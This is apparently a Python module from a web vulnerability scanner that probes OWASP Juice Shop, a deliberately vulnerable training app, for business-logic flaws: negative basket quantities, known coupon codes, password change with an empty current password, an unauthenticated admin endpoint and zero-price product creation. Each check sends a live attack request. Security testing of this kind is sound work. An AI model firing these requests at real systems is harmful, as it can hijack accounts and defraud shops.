"""
modules/business_logic.py
Juice Shop–specific business logic flaw testing.

Tests:
  - Negative basket quantity (price manipulation)
  - Coupon code bypass / stacking
  - Change password without current password
  - Admin configuration endpoint accessible unauthenticated
  - Zero-price product creation

Entry point: async def run(scanner) -> None
"""
from __future__ import annotations

import json
import urllib.parse
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from core.scanner import BaseScanner

try:
    from core.models import Vulnerability, calculate_severity
except ImportError:
    from models import Vulnerability, calculate_severity  # type: ignore


async def run(scanner: "BaseScanner") -> None:
    """Called once per scan (guard enforced by scanner via _bizlogic_done flag)."""
    base = scanner.base_url.rstrip("/")

    # ── 1. Negative quantity (price manipulation) ─────────────────────────
    neg_payload = {"ProductId": 1, "quantity": -100, "BasketId": 1}
    r = await scanner.make_request(
        "POST", f"{base}/api/BasketItems",
        json=neg_payload,
        headers={"Content-Type": "application/json"},
    )
    if r and r.status_code in (200, 201):
        try:
            data = r.json()
            qty = (data.get("data", {}) or {}).get("quantity", 0)
            if qty and int(qty) < 0:
                sev, cvss = calculate_severity("Business Logic")
                scanner.log_vuln(Vulnerability(
                    type="Business Logic",
                    url=f"{base}/api/BasketItems",
                    parameter="quantity",
                    payload=json.dumps(neg_payload),
                    evidence=f"Server accepted negative quantity ({qty}) — possible price manipulation",
                    confidence="High",
                    severity=sev,
                    cvss_score=cvss,
                    method="POST",
                    detection_method="Negative quantity accepted in basket",
                    remediation="Enforce server-side validation: quantity must be > 0",
                    references=["OWASP-A04:2021", "CWE-20"],
                    confidence_pct=90,
                    indicators_matched=1,
                ))
        except Exception:
            pass

    # ── 2. Coupon stacking / reuse ────────────────────────────────────────
    for coupon in ["JUICY", "FREE2019", "WT2019", "WMNSDY2019", "XMAS2019", "SAVE10"]:
        rc = await scanner.make_request("PUT", f"{base}/rest/basket/1/coupon/{coupon}")
        if rc and rc.status_code == 200:
            sev, cvss = calculate_severity("Business Logic")
            scanner.log_vuln(Vulnerability(
                type="Business Logic",
                url=f"{base}/rest/basket/1/coupon/{coupon}",
                parameter="coupon",
                payload=coupon,
                evidence=f"Coupon '{coupon}' accepted without login or rate limiting",
                confidence="Medium",
                severity=sev,
                cvss_score=cvss,
                method="PUT",
                detection_method="Known Juice Shop coupon code accepted",
                remediation="Validate coupon ownership and enforce single-use / per-user limits",
                references=["OWASP-A04:2021", "CWE-799"],
                confidence_pct=70,
                indicators_matched=1,
            ))
            break

    # ── 3. Change password without knowing current password ───────────────
    rp = await scanner.make_request(
        "GET", f"{base}/rest/user/change-password",
        params={"current": "", "new": "hacked123!", "repeat": "hacked123!"},
    )
    if rp and rp.status_code == 200 and "password" in rp.text.lower():
        sev, cvss = calculate_severity("Business Logic")
        scanner.log_vuln(Vulnerability(
            type="Business Logic",
            url=f"{base}/rest/user/change-password",
            parameter="current",
            payload="current=&new=hacked123!&repeat=hacked123!",
            evidence="Password changed with empty current-password field",
            confidence="High",
            severity=sev,
            cvss_score=cvss,
            method="GET",
            detection_method="Password change without current password verification",
            remediation="Always require current password for password change operations",
            references=["CWE-620", "OWASP-A07:2021"],
            confidence_pct=88,
            indicators_matched=1,
        ))

    # ── 4. Admin configuration accessible unauthenticated ────────────────
    ra = await scanner.make_request("GET", f"{base}/rest/admin/application-configuration")
    if ra and ra.status_code == 200:
        body = ra.text.lower()
        if "configuration" in body or "application" in body:
            scanner.log_vuln(Vulnerability(
                type="Business Logic",
                url=f"{base}/rest/admin/application-configuration",
                parameter="(none)",
                payload="Unauthenticated GET",
                evidence="Admin configuration returned without authentication",
                confidence="High",
                severity="High",
                cvss_score=7.5,
                method="GET",
                detection_method="Admin endpoint accessible without auth token",
                remediation="Enforce authorization on all /rest/admin/* routes",
                references=["CWE-285", "OWASP-A01:2021"],
                confidence_pct=85,
                indicators_matched=1,
            ))

    # ── 5. Zero-price product submission ─────────────────────────────────
    rz = await scanner.make_request(
        "POST", f"{base}/api/Products",
        json={"name": "FreeProduct", "description": "zero price", "price": 0,
              "image": "default.png", "deluxePrice": 0},
        headers={"Content-Type": "application/json"},
    )
    if rz and rz.status_code in (200, 201):
        sev, cvss = calculate_severity("Business Logic")
        scanner.log_vuln(Vulnerability(
            type="Business Logic",
            url=f"{base}/api/Products",
            parameter="price",
            payload='{"price": 0}',
            evidence="Product created with price=0 — potential free-item exploit",
            confidence="Medium",
            severity=sev,
            cvss_score=cvss,
            method="POST",
            detection_method="Zero-price product creation accepted",
            remediation="Validate price > 0 server-side for all product creation/update",
            references=["OWASP-A04:2021", "CWE-20"],
            confidence_pct=65,
            indicators_matched=1,
        ))
